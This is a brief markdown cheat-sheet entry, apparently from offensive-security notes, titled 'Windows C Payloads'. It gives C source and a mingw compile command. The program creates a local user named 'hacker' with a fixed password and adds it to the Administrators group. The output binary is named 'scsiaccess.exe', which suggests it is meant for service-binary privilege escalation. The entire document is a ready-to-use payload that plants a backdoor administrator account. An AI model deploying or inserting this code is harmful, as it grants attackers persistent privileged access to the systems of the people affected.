# Windows C Payloads

## Add user

```text
#i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
int main ()  
{  
    int i;
    system("net user hacker Hacker123! /add");
    system("net localgroup administrators hacker /add");  
    return 0;  
}
```

